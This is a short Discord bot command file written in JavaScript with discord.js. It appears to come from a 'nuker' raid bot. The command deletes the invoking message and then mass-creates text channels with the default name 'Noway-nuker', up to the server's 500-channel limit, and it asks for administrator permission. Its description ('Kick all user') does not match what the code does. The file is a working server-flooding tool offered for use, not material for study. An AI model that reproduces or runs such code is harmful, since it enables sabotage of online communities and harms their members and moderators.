const {
    MessageEmbed
} = require('discord.js');
const config = require('../../JSON/config.json');
module.exports  = {
    name: "spamchannel",
    aliases: [`channel`],
    category: 'Bot',
    description: `Kick all user`,
    cooldown: 5,
    BotPerms: ["ADMINISTRATOR"],
    run: async (client, message, args, prefix) => {
        message.delete()

        const amount = args[0]
        const channelName = args.slice(1).join("")

        for (let i = 0; i < amount; i++) {
            const name = channelName || 'Noway-nuker'
            if (message.guild.channels.cache.size === 500) break;
            message.guild.channels.create(name, { type: "GUILD_TEXT" })
            console.log(`[Success] Created channel: ${name}!`)
        }
        return console.log(`[Success] Finished task!`)
    }
}